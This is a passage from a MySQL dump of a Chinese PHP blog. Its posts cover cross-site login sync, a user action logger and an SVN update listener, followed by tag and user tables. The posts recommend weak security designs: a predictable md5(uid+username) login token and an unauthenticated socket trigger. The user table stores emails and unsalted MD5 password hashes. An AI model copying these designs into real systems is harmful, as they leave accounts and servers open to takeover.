src="http://localhost/otherApp2/login/sync/?uid=1"&gt;&lt;/script&gt;&nbsp;</pre><p>在其他的子系统下login控制器中也增加sync的方法即可，根据传送过来的uid去进行判断并实现对客户端的session进行初始化。</p><p>关于安全，正如上面你看到的，如果我能猜到uid，我直接访问src里面的URL也是可以实现登陆了，这是很imba的BUG，为了防止这种情况出现，你可以考虑多送一些数据，特别增加一个令牌的概念。比如：</p><pre>&lt;script src="http://localhost/otherApp1/login/sync/?uid=1&amp;token=5e965ea1645709808cdba301ecf5f687"&gt;&lt;/script&gt;</pre><p>增加了一个token的参数，这个就是令牌，你的应用就应该预先制定好这个令牌的算法（就是令牌怎样生成的），你可以有很多组合，比如paperen这里这个就是用户ID+用户名（1paperen）然后md5的，如果不告诉你是用户ID+用户名的话，你不会猜到uid为2的令牌是多少，甚至我可以加得更复杂，你可以使用一些可逆的加密进行生成令牌，最好能实现同一个用户每次都不同令牌的效果，当然paperen说的是最好不是必须，因为光是加上复杂的组合已经够那些想打主意的人头疼了。</p><p>例子改天会补上，若有兴趣paperen更推荐自己直接动手试试看</p></p>', 2, 1, 199, 0, 0, 0, 1325682890, 0);
INSERT INTO `post` (`id`, `title`, `urltitle`, `categoryid`, `content`, `authorid`, `ispublic`, `click`, `good`, `bad`, `savetime`, `posttime`, `isdraft`) VALUES
(82, '用户动作记录器', 'user-action-logger', 2, '<p>当我们设计的站点应用对安全有一定要求的话，就可能会涉及到需要记录使用者的操作记录，比如什么时候登录什么时候做了些什么之类的，你也可以称之为用户操作足迹。</p><p>具体来说要实现的最终要得到的数据是如下的：</p><pre>吴给力在 2012-02-18 01：14：13 上了厕所<br />吴给力在 2012-02-18 01：17：23 回到床上<br />吴给力在 2012-02-18 02：26：43 接起电话<br />吴给力在 2012-02-18 02：27：11 放下电话</pre><p>就针对上面这个描述来说的话，我们可以有两种解决办法：在吴给力身上装一个记录器，凡是与其身体有接触的东西都会被记录下来同时记录触发的时间；在所有东西上放置记录器，每当触摸人是吴给力时就会连同时间记录下来，理论上两种都是可行的办法，既然这样那就写写试试吧。</p><!--more--><h3>1——在吴给力身上装个记录器</h3><p>每次在吴给力进行动作时都会将该动作记录下来，让我们先写点伪代码梳理一下思路先</p><p>吴给力就是一个用户对象，所以我们需要有个用户类，在实例化时初始化用户的ID与名字，有一个声明为public的action方法就是用户做某动作的方法，有一个声明为public的userLog获取用户之前做过的动作记录</p><p>于是我们使用的时候根本不需要手动进行记录动作，我们要在action中就定义了有记录动作的功能</p><pre>$paperen = new User( 1, ''paperen'');<br />$paperen-&gt;action( ''洗厕所…'' );<br />print_r( $paperen-&gt;userLog() );</pre><p>输出的结果为</p><pre>Array<br />(<br />    [0] =&gt; Array<br />        (<br />            [time] =&gt; 11:31:26<br />            [action] =&gt; paperen 洗厕所…<br />        )<br /><br />)</pre><p>当然你还可以给构造函数第三个参数，设置是否开启动作记录功能，也就是一个false或者true就行了，user类里面多一个私有变量，下面是paperen写的代码可以参考下</p><p>user.php</p><pre>/**<br /> * 用户类<br /> */<br />class User<br />{<br /><br />    // 用户ID<br />    private $_userId;<br />    // 用户名<br />    private $_userName;<br />    // 动作记录数据<br />    private $_userLogData = array( );<br />    // 是否开启记录器<br />    private $_needLog;<br />    <br />    /**<br />     * 构造函数<br />     * @param int $userId 用户唯一ID<br />     * @param string $userName 用户名<br />     * @param bool $needLog 是否开启记录器<br />     */<br />    function __construct( $userId, $userName, $needLog = true )<br />    {<br />        $this-&gt;_userId = intval( $userId );<br />        $this-&gt;_userName = $userName;<br />        $this-&gt;_needLog = $needLog;<br />    }<br /><br />    /**<br />     * 做某些动作<br />     */<br />    public function action( $action )<br />    {<br />        //----------------------<br />        /* 做指定的动作 */<br />        //----------------------<br />        <br />        if ( $this-&gt;_needLog ) $this-&gt;_log( $action );<br />    }<br /><br />    /**<br />     * 记录用户动作<br />     * @param string $action 动作<br />     */<br />    private function _log( $action )<br />    {<br />        $log = array(<br />            ''time'' =&gt; date( ''H:i:s'' ),<br />            ''action'' =&gt; $this-&gt;_userName . '' '' . $action,<br />        );<br />        $this-&gt;_userLogData[] = $log;<br />    }<br /><br />    /**<br />     * 获取所有用户记录<br />     * @return array <br />     */<br />    public function userLog()<br />    {<br />        return $this-&gt;_userLogData;<br />    }<br /><br />}</pre><p>index.php</p><pre>date_default_timezone_set( ''PRC'' );<br /><br />require( ''user.php'' );<br /><br />// 用户ID<br />$userId = 1;<br />// 用户名<br />$userName = ''paperen'';<br /><br />// 实例化一个paperen给我们玩弄<br />$paperen = new User( $userId, $userName );<br /><br />// 获取当前的动作<br />$do = isset( $_GET[''do''] ) ? $_GET[''do''] : '''';<br />// 合法的动作<br />$validAction = array(<br />    ''wc'' =&gt; ''上厕所'',<br />    ''sleep'' =&gt; ''睡觉'',<br />    ''phone'' =&gt; ''听电话'',<br />    ''hangup'' =&gt; ''挂掉电话'',<br />);<br />if ( isset( $validAction[$do] ) ) $paperen-&gt;action( $validAction[$do] );<br /><br />// 输出动作<br />print_r( $paperen-&gt;userLog() );</pre><p>到目前就是有个雏形，其实实际中并不会像这样这么简单或者不会像这个这么理想，而且设计的模式也可能是不一样的，我们的应用有时候动作的触发点并不会放在用户身上，也不一定是单入口，我们可能需要手动记录，ok，没关系如果是需要手动记录的话将_log改为log并声明为public好了，好吧，上面这些似乎远远不足以用于实际的应用，先别急让我们再将第二种方法实现看看</p><h3>2--在“东西”上安装记录器</h3><p>在东西上安装记录器，对于第一个方法而言，你可以理解是在动作上安装记录器，而这次我们有必要有个路由了（就是要分析出用户进行的是什么动作请求时附加了什么参数）然后再分发到相应的动作上进行处理。</p><p>基于代码有点多，于是这里只放出index.php的代码，关于相关代码，请到这个链接获取<a href="http://iamlze.cn/demo/logger/logger.rar" target="_blank">http://iamlze.cn/demo/logger/logger.rar</a></p><p>以下为index.php中的代码</p><pre>date_default_timezone_set( ''PRC'' );<br /><br />// 引入用户<br />require( ''user.php'' );<br />// 用户ID<br />$userId = 1;<br />// 用户名<br />$userName = ''paperen'';<br />// 实例化一个paperen给我们玩弄<br />$paperen = new User( $userId, $userName );<br /><br />// 引入路由<br />require( ''router.php'' );<br />$router = new Router();<br /><br />// 引入记录器<br />require( ''logger.php'' );<br />$logger = new Logger( $paperen );<br /><br />// 引入动作器<br />require( ''action.php'' );<br />// 获取请求的动作<br />$routerAction = $router-&gt;action();<br />// 动作类<br />$actionClass = $routerAction . ''Action'';<br />if ( !file_exists( $actionClass . ''.php'' ) ) exit("{$actionClass}丢失");<br />require( $actionClass . ''.php'' );<br /><br />// 实例化该动作<br />$action = new $actionClass( $logger );<br />$action-&gt;go( $routerAction );<br /><br />print_r( $logger-&gt;userLog() );</pre><p>比第一个版本复杂了许多，主要是引入了路由的概念还有将记录器分离开了，至于在你的应用中记录器可能是与数据库打交道的，所以你需要将数据库操作的实例也告诉logger才行，当在访问 http://localhost/test/log/index.php/sleep&nbsp;这个URL时将会输出以下内容</p><pre>去睡觉<br />Array<br />(<br />    [0] =&gt; Array<br />        (<br />            [time] =&gt; 15:04:53<br />            [action] =&gt; paperen sleep<br />        )<br /><br />)<br /></pre><p>到此想必你已经有了你自己的想法，你可以自己动手去试试实现自己的这个动作记录器，甚至你会有更好的想法与更简洁的设计，但请记住不要在未开始设计前就否定了或者看低这些功能，永远不要放弃动手的机会。</p><p>你可以选择更随便更易懂但低智能的一些解决方法，你可以称之为过程化、函数化编程方式，但是paperen觉得你应该尝试使用对象的方式去实现这个功能。</p><pre>// 比如我自己知道这是处理sleep动作的控制器<br />// 获取用户名（假设你存在session中）<br />$userName = $_SESSION[''username''];<br />$actionString = "{$userName} 去了睡觉";<br />// 组织SQL插入logger数据表<br />$sql = "insert logger...";<br />$db-&gt;query( $sql );</pre><p>当然你还可以将其封装到一个函数中，但是这样一来你的记录器其实就是一个函数，你要在你想使用的时候调用它，它看上去并不是一个功能块，而是一个辅助函数，也不是说这没有什么好处，但是paperen就是感觉有点不太合适。</p><p>还有你最好能避免在每个动作前都要手动加上这么一段代码或者调用一下这个记录器的函数，即使不是什么很严重的问题，但是当你预料到有一天不需要记录器了，你以前加的这些代码将要一个个删掉，这也并不是什么蛋疼的假设，而是作为一个码农你得做得更加智能，不要老是看着目前而忘记了未来。</p><p>到这里这篇博文已经完毕，一定要自己尝试下手去实现，在那个过程你会想到更多而且能收获更多。而下面为paperen在CI的框架上扩展的这个功能的一些尝试，这个功能其实是与权限分不开的，可能还要进行一些调整。</p><p>需要继承CI的控制器，在application/core/中放下MY_controller.php（当然如果你配置文件中关于自己扩展的文件是为MY的话）</p><pre>class MY_Controller extends CI_Controller<br />{<br />    function __construct()<br />    {<br />        parent::__construct();<br />        <br />        // 假设用户ID为1<br />        // 其实是要先判断用户是否合法的才会有后续的步骤，但在此略过<br />        $userId = 1;<br />        <br />        // 加载权限类<br />        $this-&gt;load-&gt;library( ''permission'' );<br />        <br />        // 加载记录器类<br />        $this-&gt;load-&gt;library( ''userlogger'' );<br />        <br />        // 当前请求的控制器与方法(假设使用的URL权限机制)<br />        $currentAction = $this-&gt;router-&gt;fetch_class() . ''_'' . $this-&gt;router-&gt;fetch_method();<br />        if ( !$this-&gt;permission-&gt;verifyPermission( $currentAction ) ) exit(''抱歉，没有权限'');<br />        <br />        // 记录用户行为<br />        $this-&gt;userlogger-&gt;record( $userId, $this-&gt;permission-&gt;translatePermission( $currentAction ) );<br />    }<br />}</pre><p>增两个类permission与userlogger，都在application/libraries下</p><p>permission.php</p><pre>/*<br /> * 权限类<br /> */<br />class Permission<br />{<br />    /**<br />     * 假设我的权限有这两个<br />     * @var array <br />     */<br />    private $_permission = array(<br />        ''welcome_token'' =&gt; ''欢迎令牌'',<br />        ''form_index'' =&gt; ''表单提交'',<br />    );<br />    <br />    /**<br />     * 检查是否有权限<br />     * @param string 请求的动作<br />     */<br />    public function verifyPermission( $currentAction )<br />    {<br />        return isset( $this-&gt;_permission[$currentAction] );<br />    }<br />    <br />    /**<br />     * 权限翻译<br />     * @param string $currentAction 权限代码<br />     * @return string <br />     */<br />    public function translatePermission( $currentAction )<br />    {<br />        return isset( $this-&gt;_permission[$currentAction] ) ? $this-&gt;_permission[$currentAction] : '''';<br />    }<br />}</pre><p>userlogger.php</p><pre>/*<br /> * 用户动作记录器<br /> * <br /> */<br />class UserLogger<br />{<br />    /**<br />     * CI实例<br />     * @var CI<br />     */<br />    private $_CI;<br />    <br />    function __construct()<br />    {<br />        $this-&gt;_CI =&amp; get_instance();<br />    }<br />    <br />    /**<br />     * 记录用户行为<br />     * @param int $userId 用户ID<br />     * @param string $record 行为<br />     */<br />    public function record( $userId, $record )<br />    {<br />        $this-&gt;_CI-&gt;load-&gt;model(''userlog_model'');<br />        $this-&gt;_CI-&gt;userlog_model-&gt;insert( $userId, $record );<br />    }<br />    <br />}</pre><p>当然你需要为记录器提供数据表的支持，如果你不打算使用数据表记录的话可以自己更改userlogger中record中的记录保存方式，而paperen这个例子中使用的是一个叫userlog模型，对应着数据库中userlog这张表。当访问了http://localhost/codeigniter/index.php/form与http://localhost/codeigniter/index.php/welcome/token&nbsp;时将触发自动记录用户行为的动作了，你还可以考虑在config中加入是否启动行为记录器的配置</p><p>userlog表会有如下数据</p><p><a href="http://localhost/paperenblog/file/95" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/95" alt="20120219164533" title="上传于2012-02-19"></a></p><p>这已经比较智能，但是paperen觉得依然有更进一步的地方，而且在实际中可能并不是每个URI都得记录的，就是存在特殊情况。还有上面那个例子paperen是假设此人具有两个权限，welcome_token与form_index，分别对应welcome控制器的token方法与form控制器的index方法，如果你访问的是其他控制器或者welcome控制器的index方法之类的将会提示没有权限。</p><p>最后的最后，paperen建议不要将URI与权限混在一起了，进行权限设计的时候也不要将权限绑定到URI上，因为这个不合理，尽管有时候解析得通但是最好避免那样做。</p><p>thanks&nbsp;for&nbsp;reading！</p></p>', 2, 1, 162, 0, 0, 0, 1329641523, 0),
(83, '文件版本同步小工具', 'svn-sync-tool', 4, '<p>用了半天的时间完善与整理了上周回家写得半调子的代码，paperen倒是不清楚subversion是否支持这个功能，但是既然自己都写了就放上来吧，用的是python写的，所以也就是半调子水平。</p><p>弄这个东西的来源是因为在公司那个项目，因为要给客户看到我们那个项目的原型，所以我们在内网找了一台机子作为服务器，然后设置一下路由的转发，将公司的域名挂上去，那么客户访问指定的域名+端口号就会转发到我们内网那台机子上了，而那台机子并不是我用的开发机子，而每次原型有什么更新我都得过去那台机子上用svn&nbsp;update一下，将那台机子上的demo版本更新到最新，为了保证客户看到的demo与我们目前完善的demo是一致的。</p><p>所以嘛，你看我们每次有完善什么都得去那台机子上用鼠标操作一下，虽然不到几分钟，但是paperen也嫌麻烦，于是paperen将那台机子开启允许远程，于是自己就不要过去机子面前操作了，在自己机子上远程过去操作svn，然后就关闭远程，那比亲自走过去爽多了，但是……paperen还是觉得麻烦（不得不承认我很懒……）</p><!--more--><p>于是乎就有这么一个东西，给那台机子装个监听器，我拿着触发器，每次需要更新那台机子上的demo时我只要启动触发器就可以了！也就是1秒不到的时间，那真是太棒了！</p><p>好吧，希望这个小工具能帮到你</p><p>paperen将它放到git上，地址为<a href="https://github.com/paperen/svn-updater" target="_blank">https://github.com/paperen/svn-updater</a>&nbsp;</p><p>这里就是说说怎用好了，build里面的已经是生成的程序了，可执行文件</p><h3>SVN_listener</h3><p>svn_listener将它放到你想要远程同步的那台机子上吧，你需要手动修改一下里面的config.ini文件</p><pre>SVNPath = E:Subversionbinsvn.exe<br />SVNRep = E:phphtdocspaperenblogv2</pre><p>SVNPath为该机子的Subversion地址，也就是说该机子需要安装Svn的服务端（Subversion）<a href="http://sourceforge.net/projects/win32svn/files/latest/download?source=files" target="_blank">windows安装包地址</a></p><p>SVNRep为需要远程更新的版本路径（根据自己的情况更改）</p><p>之后双击svn_listener.exe会询问监听的端口，默认为9999，若你需要更改就换一个吧，不要使用已使用中的端口</p><p><a href="http://localhost/paperenblog/file/96" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/96" alt="20120304171738" title="上传于2012-03-04"></a></p><p>之后就让它一直监听就可以了，这代表了监听器已经开启了，它只是在等待触发器的链接与触发更新</p><p><br /></p><h3>SVN_trigger</h3><p>就是触发器，双击svn_trgger.exe启动它，会询问你监听器地址（默认为localhost），在实际中肯定不是localhost，所以你要在此输入（日后会考虑为trigger弄个config.ini就不用每次询问了），之后就是端口（默认是9999），如果你监听器不是使用9999端口那么你需要在此输入其监听的端口</p><p><a href="http://localhost/paperenblog/file/97" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/97" alt="20120304173609" title="上传于2012-03-04"></a></p><p>之后就会将远程的版本更新了，你也会在监听器中获取到触发端信息与时间</p><p><a href="http://localhost/paperenblog/file/98" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/98" alt="20120304173733" title="上传于2012-03-04"></a></p><p><br /></p><h3>php触发</h3><p>既然监听器是基于socket的，那么你也可以通过php触发（只有你有php的环境），可以不使用trigger进行触发</p><pre><br />$handle = fsockopen(''localhost'', 9999);<br />$out = ''update'';<br />fwrite($handle, $out);<br />while (!feof($handle)) {<br />	echo fgets($handle, 128);<br />}<br />fclose($handle);<br /><br />?&gt;</pre><p>在浏览器访问这个文件则可以达到同样效果，你需要输送一个命令给监听器，就是update</p><p><a href="http://localhost/paperenblog/file/99" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/99" alt="20120304174741" title="上传于2012-03-04"></a></p><p><br /></p><h3>最后<br /></h3><p>你可能需要更新一下svn客户端的版本，paperen在调试过程中就出现了客户端的版本较低，升级后就可以了，而至于svn的配置在这里就不说了，当然首要的工作是你要配置好svn不然这个工具也没用</p><p>关于这个小工具的源码在git上我都放出来了，一句话概括就是“没什么看点”……</p></p>', 2, 1, 100, 0, 0, 0, 1330854106, 0);

-- --------------------------------------------------------

--
-- 表的结构 `post_attachment`
--

CREATE TABLE IF NOT EXISTS `post_attachment` (
  `postid` int(10) unsigned NOT NULL COMMENT '文章ID',
  `attachmentid` int(10) unsigned NOT NULL COMMENT '附件ID',
  KEY `postid` (`postid`),
  KEY `attachmentid` (`attachmentid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='文章附件关联表';

--
-- 转存表中的数据 `post_attachment`
--

INSERT INTO `post_attachment` (`postid`, `attachmentid`) VALUES
(4, 1),
(4, 2),
(5, 3),
(19, 4),
(19, 5),
(14, 6),
(20, 7),
(20, 8),
(20, 9),
(22, 10),
(23, 11),
(23, 12),
(23, 13),
(23, 14),
(23, 15),
(23, 16),
(24, 17),
(24, 18),
(24, 19),
(24, 20),
(24, 21),
(25, 22),
(25, 23),
(25, 24),
(25, 25),
(25, 26),
(25, 27),
(25, 28),
(25, 29),
(27, 30),
(28, 31),
(30, 32),
(30, 33),
(30, 34),
(30, 35),
(30, 36),
(30, 37),
(30, 38),
(51, 39),
(51, 40),
(51, 41),
(51, 42),
(51, 43),
(51, 44),
(51, 45),
(31, 46),
(33, 47),
(33, 48),
(33, 49),
(33, 50),
(33, 51),
(33, 52),
(49, 53),
(49, 54),
(49, 55),
(38, 56),
(38, 57),
(38, 58),
(38, 59),
(39, 60),
(39, 61),
(40, 62),
(40, 63),
(52, 64),
(52, 65),
(44, 66),
(44, 67),
(46, 68),
(46, 69),
(46, 70),
(47, 71),
(54, 72),
(55, 73),
(55, 74),
(56, 75),
(68, 76),
(70, 77),
(71, 78),
(71, 79),
(72, 80),
(72, 81),
(72, 82),
(72, 83),
(72, 84),
(72, 85),
(73, 86),
(73, 87),
(73, 88),
(73, 89),
(75, 90),
(77, 91),
(77, 92),
(79, 93),
(81, 94),
(82, 95),
(83, 96),
(83, 97),
(83, 98),
(83, 99),
(68, 100),
(68, 101),
(68, 102),
(68, 103),
(68, 104),
(58, 105),
(58, 106),
(58, 107),
(58, 108),
(58, 109),
(59, 110),
(59, 111),
(59, 112),
(59, 113),
(61, 114),
(61, 115),
(61, 116),
(61, 117),
(61, 118),
(63, 119),
(63, 120),
(63, 121),
(63, 122),
(63, 123),
(63, 124),
(64, 125),
(64, 126),
(64, 127),
(64, 128),
(64, 129),
(64, 130),
(64, 131),
(65, 132),
(65, 133),
(66, 134),
(66, 135),
(67, 136),
(67, 137),
(68, 139);

-- --------------------------------------------------------

--
-- 表的结构 `post_tag`
--

CREATE TABLE IF NOT EXISTS `post_tag` (
  `postid` int(10) unsigned NOT NULL COMMENT '文章ID',
  `tagid` int(10) unsigned NOT NULL COMMENT '标签ID',
  KEY `postid` (`postid`,`tagid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='文章标签关联表';

--
-- 转存表中的数据 `post_tag`
--

INSERT INTO `post_tag` (`postid`, `tagid`) VALUES
(1, 1),
(1, 2),
(2, 4),
(2, 5),
(3, 6),
(4, 7),
(4, 8),
(5, 9),
(5, 10),
(6, 11),
(6, 12),
(7, 13),
(7, 14),
(8, 20),
(13, 24),
(14, 25),
(15, 26),
(16, 27),
(16, 28),
(17, 15),
(17, 16),
(18, 17),
(19, 18),
(19, 19),
(20, 29),
(20, 30),
(21, 31),
(22, 32),
(23, 33),
(24, 9),
(25, 34),
(26, 35),
(27, 36),
(28, 38),
(29, 37),
(30, 8),
(30, 39),
(31, 8),
(31, 41),
(32, 2),
(33, 8),
(33, 42),
(34, 27),
(35, 29),
(36, 28),
(37, 44),
(38, 29),
(38, 45),
(39, 8),
(39, 46),
(40, 8),
(40, 47),
(41, 21),
(42, 49),
(43, 50),
(44, 51),
(45, 8),
(45, 52),
(45, 53),
(46, 29),
(47, 54),
(47, 55),
(48, 2),
(48, 3),
(49, 28),
(49, 43),
(50, 21),
(50, 22),
(50, 23),
(51, 40),
(52, 8),
(52, 48),
(53, 8),
(53, 56),
(54, 8),
(54, 57),
(54, 58),
(54, 59),
(55, 60),
(55, 61),
(56, 62),
(56, 63),
(57, 64),
(57, 65),
(57, 66),
(58, 67),
(58, 68),
(59, 34),
(59, 69),
(60, 22),
(60, 70),
(61, 8),
(61, 71),
(61, 72),
(63, 73),
(63, 74),
(64, 75),
(64, 76),
(64, 77),
(65, 78),
(65, 79),
(65, 80),
(66, 81),
(66, 82),
(66, 83),
(67, 28),
(67, 84),
(68, 54),
(68, 85),
(68, 86),
(68, 87),
(70, 88),
(70, 89),
(70, 90),
(71, 91),
(71, 92),
(71, 93),
(72, 29),
(72, 94),
(72, 95),
(73, 80),
(73, 96),
(73, 97),
(74, 21),
(74, 22),
(74, 98),
(75, 21),
(75, 99),
(75, 100),
(75, 101),
(77, 102),
(77, 103),
(77, 104),
(79, 107),
(79, 108),
(79, 109),
(80, 105),
(80, 106),
(81, 89),
(81, 110),
(81, 111),
(82, 8),
(82, 112),
(82, 113),
(82, 114),
(83, 89),
(83, 115),
(83, 116);

-- --------------------------------------------------------

--
-- 表的结构 `tag`
--

CREATE TABLE IF NOT EXISTS `tag` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `tag` varchar(15) NOT NULL COMMENT '标签',
  PRIMARY KEY  (`id`),
  UNIQUE KEY `tag` (`tag`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='标签' AUTO_INCREMENT=117 ;

--
-- 转存表中的数据 `tag`
--

INSERT INTO `tag` (`id`, `tag`) VALUES
(1, '关于'),
(2, 'Paperen'),
(3, '博客'),
(4, '雪'),
(5, '11.2'),
(6, '面试'),
(7, '友情链接'),
(8, 'PHP'),
(9, 'AJAX'),
(10, '网页聊天'),
(11, '表单'),
(12, '数据'),
(13, '26'),
(14, '自己'),
(15, 'One'),
(16, 'Republic'),
(17, '提高'),
(18, '邮箱'),
(19, '激活'),
(20, 'json'),
(21, '工作'),
(22, '生活'),
(23, '体会'),
(24, '停顿'),
(25, '懒吧'),
(26, '实习项目'),
(27, '图片切换'),
(28, 'Jquery'),
(29, 'CSS'),
(30, '弹出层'),
(31, '递归'),
(32, 'web标准化'),
(33, 'widget'),
(34, 'sql注入'),
(35, 'google'),
(36, '报表'),
(37, '感动'),
(38, 'js'),
(39, 'WordPress'),
(40, '源代码'),
(41, '购物车'),
(42, '代码'),
(43, '图片'),
(44, '新年'),
(45, '圆角形'),
(46, 'oop'),
(47, 'phpcms'),
(48, 'header'),
(49, 'MVC'),
(50, '岁月'),
(51, 'ip转地址'),
(52, '上传'),
(53, 'class'),
(54, '网站'),
(55, '速度'),
(56, 'spl'),
(57, 'get'),
(58, '传参'),
(59, '注入'),
(60, 'uchome'),
(61, '提示框'),
(62, 'js日历控件'),
(63, 'discuz'),
(64, '中文转拼音'),
(65, '搜索提示'),
(66, '姑妈'),
(67, 'WEB安全'),
(68, '漏洞'),
(69, 'sqlinject'),
(70, '多少'),
(71, '邮件'),
(72, 'mail'),
(73, 'ide'),
(74, '字体'),
(75, '转载'),
(76, '栅格'),
(77, 'taobaoUED'),
(78, '主从同步'),
(79, '存储过程'),
(80, 'mysql'),
(81, 'GET加密'),
(82, '安全'),
(83, '偏方'),
(84, 'gallery'),
(85, '加载'),
(86, '高性能'),
(87, '前端'),
(88, 'funny'),
(89, '同步'),
(90, '聊天'),
(91, 'javascript'),
(92, '游戏'),
(93, '碰撞'),
(94, '兼容性'),
(95, 'ie6'),
(96, '锁表'),
(97, '并发'),
(98, '迷失'),
(99, '产品'),
(100, '设计'),
(101, '思考'),
(102, '令牌'),
(103, 'token'),
(104, '表单重复提交'),
(105, '年总结'),
(106, '2011'),
(107, 'CodeIgniter'),
(108, '控制器'),
(109, '模型'),
(110, '登陆'),
(111, 'sync'),
(112, '记录器'),
(113, '用户动作'),
(114, 'logger'),
(115, 'python'),
(116, 'svn');

-- --------------------------------------------------------

--
-- 表的结构 `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `id` mediumint(8) unsigned NOT NULL auto_increment,
  `name` varchar(25) NOT NULL COMMENT '帐号',
  `url` varchar(50) NOT NULL default '0' COMMENT '个人站点',
  `email` varchar(35) NOT NULL COMMENT '邮箱',
  `password` char(32) NOT NULL COMMENT '密码',
  `lastlogin` int(10) unsigned NOT NULL COMMENT '最近登录时间戳',
  `lastip` int(10) unsigned NOT NULL COMMENT '最近登录IP',
  `identity` enum('admin','author','reader') NOT NULL default 'reader' COMMENT '身份',
  PRIMARY KEY  (`id`),
  UNIQUE KEY `user` (`name`),
  UNIQUE KEY `email` (`email`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='用户表' AUTO_INCREMENT=3 ;

--
-- 转存表中的数据 `user`
--

INSERT INTO `user` (`id`, `name`, `url`, `email`, `password`, `lastlogin`, `lastip`, `identity`) VALUES
(1, '管理员', '0', 'admin@gmail.com', '64a69ea9e9df5a1f24c8e5abf926b4eb', 1289792105, 3071236922, 'admin'),
(2, 'paperen', '0', 'paperen@gmail.com', '64a69ea9e9df5a1f24c8e5abf926b4eb', 1289792105, 3071236922, 'author');
